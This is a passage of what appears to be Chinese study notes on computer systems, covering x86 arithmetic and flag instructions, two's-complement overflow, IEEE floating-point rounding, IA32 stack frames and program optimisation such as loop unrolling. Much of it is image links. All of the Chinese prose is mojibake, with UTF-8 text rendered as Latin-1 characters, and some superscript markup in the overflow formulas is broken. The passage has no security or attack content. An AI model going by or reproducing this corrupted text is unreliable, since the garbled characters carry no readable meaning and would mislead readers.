ç®—æœ¯é€»è¾‘è¿ç®—æŒ‡ä»¤</h3><p>é«˜32ä½æ”¾%edx</p><p>ç®—æœ¯å³ç§»ï¼šå¡«å……ç¬¦å·ä½</p><p>é€»è¾‘ç§»ä½ï¼šå·¦è¾¹å¡«0</p><p><img src="/posts/e0eae192/image-20210315190841025.png" alt="image-20210315190841025"></p><p><img src="/posts/e0eae192/image-20210414183735292.png" alt="image-20210414183735292"></p><p><img src="/posts/e0eae192/image-20210414183744478.png" alt="image-20210414183744478"></p><h3 id="æ¡ä»¶è·³è½¬æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ¡ä»¶è·³è½¬æŒ‡ä»¤"></a> æ¡ä»¶è·³è½¬æŒ‡ä»¤</h3><p><img src="/posts/e0eae192/image-20210315195500018.png" alt="image-20210315195500018"></p><p><img src="/posts/e0eae192/image-20210315195530982.png" alt="image-20210315195530982"></p><h3 id="æ ‡å¿—ä½æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æ ‡å¿—ä½æŒ‡ä»¤"></a> æ ‡å¿—ä½æŒ‡ä»¤</h3><p><img src="/posts/e0eae192/image-20210414173258979.png" alt="image-20210414173258979"></p><p>æœ€åä¸€æï¼šè®¡ç®—æœºå¯¹å¸¦/æ— ç¬¦å·æ•°çš„æœºå™¨ç ç»Ÿä¸€å¤„ç†<br>O F ï¼Œ ï¼£ ï¼¦ ç­‰ æ ‡ å¿— ä½ æ˜¯ ç”± æœº å™¨ ç  è¿ ç®— ç»“ æœ å†³ å®š çš„ ï¼Œ æ˜¯ å¦ ä¸º å¸¦ ç¬¦ å· æ•° å¹¶ ä¸ å½± å“</p><p>ç»ˆæç®€å•çš„åˆ¤å®šæ–¹æ³•ï¼š</p><p>æ±‚OFå°±æŠŠæœºå™¨ç è½¬æˆå¸¦ç¬¦å·æ•°ç„¶åè¿ç®—ï¼Œçœ‹æœ‰æ²¡æœ‰æº¢å‡º</p><p>æ±‚CFåŒç†ï¼Œè½¬æˆæ— ç¬¦å·æ•°ï¼Œç„¶åè¿ç®—çœ‹æœ‰æ²¡æœ‰æº¢å‡º</p><h3 id="æ­£æº¢å‡º-å’Œ-è´Ÿæº¢å‡º"><a class="markdownIt-Anchor" href="#æ­£æº¢å‡º-å’Œ-è´Ÿæº¢å‡º"></a> æ­£æº¢å‡º å’Œ è´Ÿæº¢å‡º</h3><p>å¦‚æœä½æ•° ä¸ºw çš„ä¸¤ä¸ªæ•°x,y;ä¸”åœ¨ç³»ç»Ÿä¸­ä¸ºè¡¥ç è¡¨ç¤ºï¼Œ<br>å¦‚æœï¼š      -2<sup>(w-1)&lt;=x+y&lt;2</sup>(w-1) åˆ™ç»“æœæ­£å¸¸</p><p>x+y&lt;-2<sup>(w-1)</sup>å‘ç”Ÿè´Ÿæº¢å‡º ç»“æœä¸ºx+y+2<sup>w</sup><br>x+y&gt;=2<sup>(w-1)</sup>å‘ç”Ÿæ­£æº¢å‡º ç»“æœä¸ºx+y-2<sup>w</sup></p><p>æ¨å¯¼è¿‡ç¨‹:<br>å¯¹äºä¸€ä¸ªwä½ï¼Œä»–æ‰€èƒ½è¡¨è¾¾å€¼å¾—èŒƒå›´ï¼š</p><p>æ¯”å¦‚ w=4:           0 0 0 0        æœ€å¤§å€¼ 0 1 1 1=7  (2^(4-1)-1)<br>æœ€å°å€¼ 1 0 0 0=-8  (-2^(4-1) )</p><p>è¶…å‡ºè¿™ä¸ªèŒƒå›´å°†å‘ç”Ÿæº¢å‡ºï¼Œæˆªæ–­æº¢å‡ºä½ï¼š</p><p>è´Ÿæº¢å‡º+2^w<br>æ­£æº¢å‡º-2^w<br><img src="/posts/e0eae192/image-20210414173419106.png" alt="image-20210414173419106"></p><h3 id="æ¡ä»¶ç ç›¸å…³çŸ¥è¯†"><a class="markdownIt-Anchor" href="#æ¡ä»¶ç ç›¸å…³çŸ¥è¯†"></a> æ¡ä»¶ç ç›¸å…³çŸ¥è¯†</h3><p><img src="/posts/e0eae192/image-20210315200213357.png" alt="image-20210315200213357"></p><h2 id="ç¬¬ä¸‰ç« -ä½å­—èŠ‚å’Œä¿¡æ¯å­˜å‚¨"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰ç« -ä½å­—èŠ‚å’Œä¿¡æ¯å­˜å‚¨"></a> ç¬¬ä¸‰ç«  ä½å­—èŠ‚å’Œä¿¡æ¯å­˜å‚¨</h2><h3 id="ä¿¡æ¯çš„ä½ä¸è¡¨ç¤º"><a class="markdownIt-Anchor" href="#ä¿¡æ¯çš„ä½ä¸è¡¨ç¤º"></a> ä¿¡æ¯çš„ä½ä¸è¡¨ç¤º</h3><ul><li><strong>å…¸å‹æ•°æ®ç±»å‹çš„é•¿åº¦</strong></li></ul><p><img src="/posts/e0eae192/image-20210414182913863.png" alt></p><ul><li><p><strong>å­—èŠ‚é¡ºåº</strong></p><p><img src="/posts/e0eae192/image-20210414175028953.png" alt="image-20210414175028953"></p></li></ul><h3 id="æ•´æ•°"><a class="markdownIt-Anchor" href="#æ•´æ•°"></a> æ•´æ•°</h3><p><img src="/posts/e0eae192/image-20210414180814272.png" alt></p><h3 id="æµ®ç‚¹æ•°"><a class="markdownIt-Anchor" href="#æµ®ç‚¹æ•°"></a> æµ®ç‚¹æ•°</h3><h4 id="ieeeæµ®ç‚¹æ•°æ ‡å‡†"><a class="markdownIt-Anchor" href="#ieeeæµ®ç‚¹æ•°æ ‡å‡†"></a> IEEE<strong>æµ®ç‚¹æ•°æ ‡å‡†</strong></h4><p><img src="/posts/e0eae192/image-20210414181040336.png" alt="image-20210414181040336"></p><p><img src="/posts/e0eae192/image-20210414181054897.png" alt="image-20210414181054897"></p><blockquote><p><strong>è§„æ ¼åŒ–å€¼</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181116849.png" alt="image-20210414181116849"></p><p><img src="/posts/e0eae192/image-20210414181322258.png" alt="image-20210414181322258"></p><blockquote><p><strong>éè§„æ ¼åŒ–å€¼</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181242656.png" alt="image-20210414181242656"></p><blockquote><p><strong>ç‰¹æ®Šå€¼</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414181430845.png" alt="image-20210414181430845"></p><p><img src="/posts/e0eae192/image-20210621222546804.png" alt="image-20210621222546804"></p><h4 id="èˆå…¥å’Œè¿ç®—"><a class="markdownIt-Anchor" href="#èˆå…¥å’Œè¿ç®—"></a> <strong>èˆå…¥å’Œè¿ç®—</strong></h4><blockquote><p><strong>æµ®ç‚¹æ•°èˆå…¥è§„åˆ™</strong></p></blockquote><p>å¦‚æœä»¥å½¢å¼1.RRâ€¦RDDâ€¦Dè¡¨ç¤ºæµ®ç‚¹æ•°ï¼ˆRè¡¨ç¤ºæœ‰æ•ˆä½ï¼Œæˆ–ä¿ç•™ä½ï¼Œè€ŒDè¡¨ç¤ºèˆå»ä½ï¼‰ï¼Œèˆå…¥è§„åˆ™å°±æ˜¯ï¼š</p><p>å¦‚æœDDâ€¦D &lt; 10â€¦0ï¼Œåˆ™å‘ä¸‹èˆå…¥</p><p>å¦‚æœDDâ€¦D &gt; 10â€¦0ï¼Œåˆ™å‘ä¸Šèˆå…¥</p><p>å¦‚è¦DDâ€¦D = 10â€¦0ï¼Œåˆ™å‘æœ€è¿‘å¶æ•°èˆå…¥ï¼Œç»†åˆ™å¦‚ä¸‹ ï¼š</p><p>a. å¦‚æœRRâ€¦R = XXâ€¦0 ï¼ˆæœ€ä½æœ‰æ•ˆä½æ˜¯0ï¼‰ï¼Œåˆ™å‘ä¸‹èˆå…¥</p><p>b. å¦‚æœRRâ€¦R = XXâ€¦1ï¼ˆæœ€ä½æœ‰æ•ˆä½æ˜¯1ï¼‰ï¼Œåˆ™å‘ä¸Šèˆå…¥</p><blockquote><p><strong>æµ®ç‚¹æ•°è¿ç®—</strong></p></blockquote><p><img src="/posts/e0eae192/image-20210414182405160.png" alt="image-20210414182405160"></p><p><img src="/posts/e0eae192/image-20210414182418619.png" alt="image-20210414182418619"></p><h2 id="ç¬¬å››ç« -ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º"><a class="markdownIt-Anchor" href="#ç¬¬å››ç« -ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º"></a> ç¬¬å››ç«   ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º</h2><h3 id="åŸºæœ¬"><a class="markdownIt-Anchor" href="#åŸºæœ¬"></a> åŸºæœ¬</h3><h4 id="ia32å¯„å­˜å™¨"><a class="markdownIt-Anchor" href="#ia32å¯„å­˜å™¨"></a> IA32å¯„å­˜å™¨</h4><p><img src="/posts/e0eae192/image-20210414184335897.png" alt="image-20210414184335897"></p><h4 id="ç®—æœ¯æ“ä½œ"><a class="markdownIt-Anchor" href="#ç®—æœ¯æ“ä½œ"></a> ç®—æœ¯æ“ä½œ</h4><p><img src="/posts/e0eae192/image-20210414184419105.png" alt="image-20210414184419105"></p><p><img src="/posts/e0eae192/image-20210414184428359.png" alt="image-20210414184428359"></p><p><img src="/posts/e0eae192/image-20210414184615336.png" alt="image-20210414184615336"></p><h3 id="æ§åˆ¶"><a class="markdownIt-Anchor" href="#æ§åˆ¶"></a> æ§åˆ¶</h3><p><img src="/posts/e0eae192/image-20210414185557502.png" alt="image-20210414185557502"></p><h4 id="æ¡ä»¶ç è®¾ç½®"><a class="markdownIt-Anchor" href="#æ¡ä»¶ç è®¾ç½®"></a> æ¡ä»¶ç è®¾ç½®</h4><p><img src="/posts/e0eae192/image-20210414185743149.png" alt="image-20210414185743149"></p><p><img src="/posts/e0eae192/image-20210414185759630.png" alt="image-20210414185759630"></p><p><img src="/posts/e0eae192/image-20210414185811106.png" alt="image-20210414185811106"></p><p><img src="/posts/e0eae192/image-20210414185821323.png" alt="image-20210414185821323"></p><h3 id="è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹"></a> è¿‡ç¨‹</h3><h4 id="æ ˆå¸§"><a class="markdownIt-Anchor" href="#æ ˆå¸§"></a> æ ˆå¸§</h4><p><img src="/posts/e0eae192/image-20210416102006727.png" alt="image-20210416102006727"></p><blockquote><p><strong>callæŒ‡ä»¤</strong></p></blockquote><ol><li><p>æŠŠä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹æ ˆb</p></li><li><p>å†æŠŠè°ƒç”¨çš„å‡½æ•°åœ°å€ç»™eip</p></li></ol><blockquote><p><strong>leaveæŒ‡ä»¤</strong></p></blockquote><ol><li>movl %ebp %esp  å°†espå›åˆ°ä¸Šä¸€ä¸ªè¿‡ç¨‹çš„æ ˆé¡¶ä½ç½®ï¼Œå³ebpçš„åœ°å€</li><li>popl %ebp              å°†æ—§çš„ebpåœ°å€è¿”å›ebp</li></ol><blockquote><p><strong>ret</strong></p></blockquote><p>pop %eip  å°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ç»™%eip</p><h3 id="å¤æ‚æ•°æ®çš„æœºå™¨çº§è¡¨ç¤º"><a class="markdownIt-Anchor" href="#å¤æ‚æ•°æ®çš„æœºå™¨çº§è¡¨ç¤º"></a> å¤æ‚æ•°æ®çš„æœºå™¨çº§è¡¨ç¤º</h3><h2 id="ç¬¬äº”ç« -ä¼˜åŒ–ç¨‹åºæ€§èƒ½"><a class="markdownIt-Anchor" href="#ç¬¬äº”ç« -ä¼˜åŒ–ç¨‹åºæ€§èƒ½"></a> ç¬¬äº”ç«  ä¼˜åŒ–ç¨‹åºæ€§èƒ½</h2><h3 id="ç¼–è¯‘å™¨çš„å±€é™"><a class="markdownIt-Anchor" href="#ç¼–è¯‘å™¨çš„å±€é™"></a> ç¼–è¯‘å™¨çš„å±€é™</h3><ul><li><p>å¦¨ç¢ä¼˜åŒ–çš„å› ç´ </p><ol><li><p>å­˜å‚¨å™¨çš„åˆ«åä½¿ç”¨</p><p><strong>å­˜å‚¨å™¨åˆ«åä½¿ç”¨</strong>æ˜¯æŒ‡ä¸¤ä¸ªæŒ‡é’ˆå¯èƒ½åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå­˜å‚¨å™¨çš„ä½ç½®çš„æƒ…å†µã€‚åœ¨åªè€ƒè™‘æ‰§è¡Œå®‰å…¨çš„ä¼˜åŒ–ä¸­ï¼Œç¼–è¯‘å™¨å¿…é¡»å‡è®¾ä¸åŒçš„æŒ‡é’ˆå¯èƒ½ä¼šæŒ‡å‘å­˜å‚¨å™¨çš„åŒä¸€ä¸ªä½ç½®ï¼Œè¿™é€ æˆäº†<strong>ç¬¬ä¸€ä¸ªå¦¨ç¢ä¼˜åŒ–çš„å› ç´ </strong>ï¼Œè¿™ä¹Ÿæ˜¯å¯èƒ½ä¸¥é‡é™åˆ¶ç¼–è¯‘å™¨äº§ç”Ÿä¼˜åŒ–ä»£ç æœºä¼šçš„ç¨‹åºçš„ä¸€ä¸ªæ–¹é¢ã€‚å¦‚æœç¼–è¯‘å™¨ä¸èƒ½ç¡®å®šæŒ‡é’ˆçš„æŒ‡å‘ï¼Œå®ƒå°±ä¼šå‡è®¾æ‰€æœ‰çš„æƒ…å†µéƒ½æœ‰å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯åœ¨<strong>ç¼–å†™ç¨‹åºçš„æ—¶å€™æ˜ç¡®æŒ‡é’ˆçš„æŒ‡å‘</strong>ã€‚</p></li><li><p>å‡½æ•°è°ƒç”¨</p><p><strong>å‡½æ•°è°ƒç”¨</strong>æ˜¯<strong>ç¬¬äºŒä¸ªå¦¨ç¢ä¼˜åŒ–çš„å› ç´ </strong>ã€‚å°½å¯èƒ½å‡å°‘å‡½æ•°çš„è°ƒç”¨å¯ä»¥ä¼˜åŒ–ç¨‹åºï¼Œä½†æ˜¯ç¼–è¯‘å™¨ä¼šå‡è®¾æœ€ç³Ÿç³•çš„æƒ…å†µï¼Œå¹¶<strong>ä¿æŒæ‰€æœ‰çš„å‡½æ•°è°ƒç”¨ä¸å˜</strong>ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨<strong>ç¼–å†™ç¨‹åºçš„æ—¶å€™å°†å‡½æ•°è°ƒç”¨çš„æ¬¡æ•°å°½å¯èƒ½å‡å°‘</strong>ï¼Œè¿™ä»¶äº‹æƒ…åªèƒ½coderæ¥åšï¼Œç¼–è¯‘å™¨ä¸ºäº†å®‰å…¨æ˜¯ä¸ä¼šå»åšçš„ã€‚</p></li></ol></li></ul><h3 id="è¡¨ç¤ºç¨‹åºæ€§èƒ½"><a class="markdownIt-Anchor" href="#è¡¨ç¤ºç¨‹åºæ€§èƒ½"></a> è¡¨ç¤ºç¨‹åºæ€§èƒ½</h3><ul><li><p>ç”¨<strong>æ¯å…ƒç´ çš„å‘¨æœŸæ•°</strong>ï¼ˆCycles Per Element ï¼Œ<strong>CPE</strong>ï¼‰ä½œä¸º<strong>ç¨‹åºæ€§èƒ½çš„åº¦é‡æ ‡å‡†</strong>ã€‚å®ƒçš„è®¡ç®—è¿‡ç¨‹æ˜¯ï¼šå…ˆå¾—åˆ°å‡½æ•°çš„å…ƒç´ ä¸ªæ•°å’Œå‘¨æœŸçš„æ•£ç‚¹å›¾ï¼Œåç»è¿‡<strong>æœ€å°äºŒä¹˜æ–¹æ‹Ÿåˆ</strong>å¾—åˆ°æŠ˜çº¿å›¾ï¼Œå…¶ä¸­<strong>æŠ˜çº¿çš„æ–œç‡</strong>è¡¨æ˜<strong>æ¯å…ƒç´ çš„å‘¨æœŸæ•°CPE</strong>ã€‚</p></li><li><p>**è¿è¡Œæ—¶é—´ï¼š**ä¸€ä¸ªå…ƒç´ å®ŒæˆåŠŸèƒ½æ‰€è¿è¡Œçš„æ—¶é—´</p></li><li><p><strong>å‘¨æœŸæ•°æ¯å…ƒç´ (Cycles Per Element, CPE )</strong> ï¼šè¿è¡Œæ—¶é—´/æ—¶é’Ÿå‘¨æœŸ</p></li><li><p>**æ—¶é—´å‘¨æœŸï¼š**CPUå®Œæˆä¸€ä¸ªåŸºæœ¬åŠ¨ä½œçš„æ—¶é—´ï¼ˆå¯¹åº”ä¸€ä¸ªç”µå¹³ä¿¡å·å®½åº¦ï¼‰</p></li><li><p>ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸæ˜¯å¤šé•¿æ—¶é—´å‘¢ï¼Ÿ<br>é€šå¸¸å½“ä¸€ä¸ªæ ‡æœ‰â€œ4GHzâ€çš„å¤„ç†å™¨ï¼Œè¡¨ç¤ºå¤„ç†å™¨æ¯ç§’è¿è¡Œ4X10^9ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œä¸€ä¸ªæ—¶é’Ÿå‘¨<br>æœŸçš„æ—¶é•¿æ˜¯æ—¶é’Ÿé¢‘ç‡çš„å€’æ•°ï¼Œä¸º0.25X10^{-9}ç§’=0.25çº³ç§’ï¼ˆ250çš®ç§’ï¼‰<br>Hzï¼Œ KHzï¼Œ MHz, GHz<br>ç§’ï¼Œ æ¯«ç§’ï¼Œ å¾®ç§’ï¼Œçº³ç§’</p></li></ul><h3 id="ä¸ä¾èµ–äºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#ä¸ä¾èµ–äºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–"></a> ä¸ä¾èµ–äºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–</h3><h4 id="1-æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡"><a class="markdownIt-Anchor" href="#1-æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡"></a> 1. æ¶ˆé™¤å¾ªç¯çš„ä½æ•ˆç‡</h4><p><img src="/posts/e0eae192/image-20210608153952303.png" alt="image-20210608153952303"></p><p>è¿™ä¸ªä¼˜åŒ–æ˜¯ä¸€ç±»å¸¸è§çš„ä¼˜åŒ–çš„ä¸€ä¸ªä¾‹å­ï¼Œç§°ä¸º<strong>ä»£ç ç§»åŠ¨( code motion</strong>)ã€‚è¿™ç±»ä¼˜åŒ–åŒ…æ‹¬è¯†åˆ«è¦æ‰§è¡Œå¤šæ¬¡ï¼ˆä¾‹å¦‚åœ¨å¾ªç¯é‡Œï¼‰ä½†æ˜¯è®¡ç®—ç»“æœä¸ä¼šæ”¹å˜çš„è®¡ç®—ã€‚å› è€Œå¯ä»¥å°†è®¡ç®—ç§»åŠ¨åˆ°ä»£ç å‰é¢ä¸ä¼šè¢«å¤šæ¬¡æ±‚å€¼çš„éƒ¨åˆ†ã€‚</p><h4 id="2-å‡å°‘è¿‡ç¨‹è°ƒç”¨"><a class="markdownIt-Anchor" href="#2-å‡å°‘è¿‡ç¨‹è°ƒç”¨"></a> 2. å‡å°‘è¿‡ç¨‹è°ƒç”¨</h4><p><img src="/posts/e0eae192/image-20210609142759377.png" alt="image-20210609142759377"></p><h4 id="3-æ¶ˆé™¤ä¸å¿…è¦çš„å­˜å‚¨å™¨å¼•ç”¨"><a class="markdownIt-Anchor" href="#3-æ¶ˆé™¤ä¸å¿…è¦çš„å­˜å‚¨å™¨å¼•ç”¨"></a> 3. æ¶ˆé™¤ä¸å¿…è¦çš„å­˜å‚¨å™¨å¼•ç”¨</h4><p><img src="/posts/e0eae192/image-20210609143101235.png" alt="image-20210609143101235"></p><h3 id="ç†è§£ç°ä»£å¤„ç†å™¨"><a class="markdownIt-Anchor" href="#ç†è§£ç°ä»£å¤„ç†å™¨"></a> ç†è§£ç°ä»£å¤„ç†å™¨</h3><h4 id="åŠŸèƒ½å•å…ƒçš„æ€§èƒ½"><a class="markdownIt-Anchor" href="#åŠŸèƒ½å•å…ƒçš„æ€§èƒ½"></a> åŠŸèƒ½å•å…ƒçš„æ€§èƒ½</h4><p><img src="/posts/e0eae192/image-20210609162108070.png" alt="image-20210609162108070"></p><p><img src="/posts/e0eae192/image-20210609162041644.png" alt="image-20210609162041644"></p><ul><li><strong>å»¶è¿Ÿ</strong>ï¼šå®Œæˆè¿ç®—æ‰€éœ€è¦çš„æ€»æ—¶é—´</li><li><strong>å‘å°„æ—¶é—´</strong>ï¼šè¡¨ç¤ºä¸¤ä¸ªè¿ç»­çš„åŒç±»å‹çš„è¿ç®—ä¹‹é—´æ‰€éœ€è¦çš„æœ€å°æ—¶é’Ÿå‘¨æœŸæ•°</li><li><strong>æœ€å¤§ååé‡</strong>ï¼šå‘å°„æ—¶é—´çš„å€’æ•°</li><li><strong>å»·è¿Ÿç•Œé™</strong>ï¼šç»™å‡ºäº†ä»»ä½•å¿…é¡»æŒ‰ç…§ä¸¥æ ¼é¡ºåºå®Œæˆåˆå¹¶è¿ç®—çš„å‡½æ•°æ‰€éœ€è¦çš„æœ€å°CPEå€¼ã€‚</li><li><strong>ååé‡ç•Œé™</strong>ï¼šæ ¹æ®åŠŸèƒ½å•å…ƒäº§ç”Ÿç»“æœçš„æœ€å¤§é€Ÿç‡ï¼Œååé‡ç•Œé™ç»™å‡ºäº†CPEçš„æœ€å°ç•Œé™ã€‚</li></ul><h4 id="å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹"><a class="markdownIt-Anchor" href="#å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹"></a> å¤„ç†å™¨æ“ä½œçš„æŠ½è±¡æ¨¡å‹</h4><h5 id="1ä»æœºå™¨çº§ä»£ç åˆ°æ•°æ®æµå›¾"><a class="markdownIt-Anchor" href="#1ä»æœºå™¨çº§ä»£ç åˆ°æ•°æ®æµå›¾"></a> 1.ä»æœºå™¨çº§ä»£ç åˆ°æ•°æ®æµå›¾</h5><p><img src="/posts/e0eae192/image-20210609162352543.png" alt="image-20210609162352543"></p><p><img src="/posts/e0eae192/image-20210609162425613.png" alt="image-20210609162425613"></p><p><img src="/posts/e0eae192/image-20210609162517278.png" alt="image-20210609162517278"></p><p>å›¾ä¸­çš„é“¾æ˜¯é™åˆ¶æ€§èƒ½çš„å…³é”®è·¯å¾„</p><h5 id="2å…¶ä»–æ€§èƒ½å› ç´ "><a class="markdownIt-Anchor" href="#2å…¶ä»–æ€§èƒ½å› ç´ "></a> 2.å…¶ä»–æ€§èƒ½å› ç´ </h5><ul><li>æ•°æ®æµè¡¨ç¤ºçš„çš„<strong>å…³é”®è·¯å¾„</strong>æä¾›çš„åªæ˜¯<strong>ç¨‹åºéœ€è¦å‘¨æœŸæ•°çš„ä¸‹ç•Œ</strong>ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›å› ç´ ä¼šé™åˆ¶æ€§èƒ½ï¼ŒåŒ…æ‹¬<br><strong>å¯ç”¨çš„åŠŸèƒ½å•å…ƒçš„æ•°é‡</strong>å’Œ<strong>ä»»ä½•ä¸€æ­¥ä¸­åŠŸèƒ½å•å…ƒä¹‹é—´èƒ½å¤Ÿä¼ é€’æ•°æ®å€¼çš„æ•°é‡</strong>ã€‚</li></ul><h3 id="åŸºäºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–"><a class="markdownIt-Anchor" href="#åŸºäºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–"></a> åŸºäºæœºå™¨ç‰¹æ€§çš„ä¼˜åŒ–</h3><h4 id="1å¾ªç¯å±•å¼€"><a class="markdownIt-Anchor" href="#1å¾ªç¯å±•å¼€"></a> 1.å¾ªç¯å±•å¼€</h4><p><strong>å¾ªç¯å±•å¼€</strong>æ˜¯ä¸€ç§ç¨‹åºå˜æ¢ï¼Œé€šè¿‡å¢åŠ æ¯æ¬¡è¿­ä»£è®¡ç®—çš„å…ƒç´ çš„æ•°é‡ï¼Œå‡å°‘å¾ªç¯çš„è¿­ä»£æ¬¡æ•°ã€‚</p><p>å¾ªç¯å±•å¼€èƒ½å¤Ÿä»<strong>ä¸¤ä¸ªæ–¹é¢</strong>æ”¹ç¨‹åºçš„æ€§èƒ½ï¼š</p><ul><li><p>é¦–å…ˆï¼Œå®ƒå‡å°‘äº†ä¸ç›´æ¥æœ‰åŠ©äºç¨‹åºç»“æœçš„æ“ä½œçš„æ•°é‡ï¼Œä¾‹å¦‚å¾ªç¯ç´¢å¼•è®¡ç®—å’Œæ¡ä»¶åˆ†æ”¯ã€‚</p></li><li><p>å…¶æ¬¡ï¼Œå®ƒæä¾›äº†ãƒ¼äº›æ–¹æ³•ï¼Œå¯ä»¥è¿›ä¸€æ­¥å˜åŒ–ä»£ç ï¼Œå‡å°‘æ•´ä¸ªè®¡ç®—ä¸­å…³é”®è·¯å¾„ä¸Šçš„æ“ä½œæ•°é‡ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä¼šçœ‹ä¸€äº›ç®€å•çš„å¾ªç¯å±•å¼€ï¼Œä¸åšä»»ä½•è¿›ä¸€æ­¥çš„å˜åŒ–</p></li></ul><p>å¾ªç¯å±•å¼€ç¤ºä¾‹ï¼š<img src="/posts/e0eae192/image-20210609163517926.png" alt="image-20210609163517926"></p><p><img src="/posts/e0eae192/image-20210609163640228.png" alt="image-20210609163640228"></p><p><img src="/posts/e0eae192/image-20210619165210954.png" alt="image-20210619165210954"></p><p>å¾ªç¯å±•å¼€å¯ä»¥æé«˜æ•´æ•°åŠ æ³•å’Œä¹˜æ³•çš„æ€§èƒ½ï¼Œå› ä¸ºGCCä¼šå¯¹æ•´æ•°ä¹˜æ³•åšé‡å…³è”å˜æ¢ï¼Œä½†ä¸ä¼šæ”¹å˜æµ®ç‚¹åŠ æ³•å’Œä¹˜æ³•åšåšè¿™ç§å˜åŒ–ï¼Œæ‰€ä»¥æ€§èƒ½å¹¶æ²¡æœ‰æå‡</p><h4 id="2æé«˜å¹¶è¡Œæ€§"><a class="markdownIt-Anchor" href="#2æé«˜å¹¶è¡Œæ€§"></a> 2.æé«˜å¹¶è¡Œæ€§</h4><h5 id="1-å¤šä¸ªç´¯è®¡å˜é‡"><a class="markdownIt-Anchor" href="#1-å¤šä¸ªç´¯è®¡å˜é‡"></a> 1) å¤šä¸ªç´¯è®¡å˜é‡</h5><p><img src="/posts/e0eae192/image-20210609164539108.png" alt="image-20210609164539108"></p><p><img src="/posts/e0eae192/image-20210609164604747.png" alt="image-20210609164604747"></p><p><img src="/posts/e0eae192/image-20210619165230377.png" alt="image-20210619165230377"></p><h5 id="2-é‡æ–°ç»“åˆå˜æ¢"><a class="markdownIt-Anchor" href="#2-é‡æ–°ç»“åˆå˜æ¢"></a> 2) é‡æ–°ç»“åˆå˜æ¢</h5><p>æ”¹å˜åˆå¹¶é¡ºåºï¼š</p><p><img src="/posts/e0eae192/image-20210609164646452.png" alt="image-20210609164646452"></p><p><img src="/posts/e0eae192/image-20210609164734377.png" alt="image-20210609164734377"></p><p><img src="/posts/e0eae192/image-20210609164801356.png" alt="image-20210609164801356"></p><p><img src="/posts/e0eae192/image-20210619165247136.png" alt="image-20210619165247136"></p><h3 id="ä¸€äº›é™åˆ¶å› ç´ "><a class="markdownIt-Anchor" href="#ä¸€äº›é™åˆ¶å› ç´ "></a> ä¸€äº›é™åˆ¶å› ç´ </h3><ol><li>å¯„å­˜å™¨æº¢å‡º</li><li>åˆ†æ”¯é¢„æµ‹å’Œé¢„æµ‹é”™è¯¯å¤„ç½š</li></ol><h3 id="ç†è§£å­˜å‚¨å™¨çš„æ€§èƒ½"><a class="markdownIt-Anchor" href="#ç†è§£å­˜å‚¨å™¨çš„æ€§èƒ½"></a> ç†è§£å­˜å‚¨å™¨çš„æ€§èƒ½</h3><h4 id="åŠ è½½çš„æ€§èƒ½"><a class="markdownIt-Anchor" href="#åŠ è½½çš„æ€§èƒ½"></a> åŠ è½½çš„æ€§èƒ½</h4><p><img src="/posts/e0eae192/image-20210609171007080.png" alt="image-20210609171007080"></p><h4 id="å­˜å‚¨çš„æ€§èƒ½"><a class="markdownIt-Anchor" href="#å­˜å‚¨çš„æ€§èƒ½"></a> å­˜å‚¨çš„æ€§èƒ½</h4><h3 id="ä¼˜åŒ–ç¨‹åºæ€§èƒ½çš„åŸºæœ¬ç­–ç•¥"><a class="markdownIt-Anchor" href="#ä¼˜åŒ–ç¨‹åºæ€§èƒ½çš„åŸºæœ¬ç­–ç•¥"></a> ä¼˜åŒ–ç¨‹åºæ€§èƒ½çš„åŸºæœ¬ç­–ç•¥</h3><p><strong>1)é«˜çº§è®¾è®¡</strong></p><p>ä¸ºé‡åˆ°çš„é—®é¢˜é€‰æ‹©é€‚å½“çš„ç®—æ³•å’Œæ•°æ®ç»“æ„ã€‚è¦ç‰¹åˆ«è­¦è§‰ï¼Œé¿å…ä½¿ç”¨é‚£äº›ä¼šæ¸è¿›åœ°äº§ç”Ÿç³Ÿç³•æ€§èƒ½çš„ç®—æ³•æˆ–ç¼–ç æŠ€æœ¯ã€‚<br><strong>2)åŸºæœ¬ç¼–ç åŸåˆ™</strong></p><p>é¿å…é™åˆ¶ä¼˜åŒ–çš„å› ç´ ï¼Œè¿™æ ·ç¼–è¯‘å™¨å°±èƒ½äº§ç”Ÿé«˜æ•ˆçš„ä»£ç 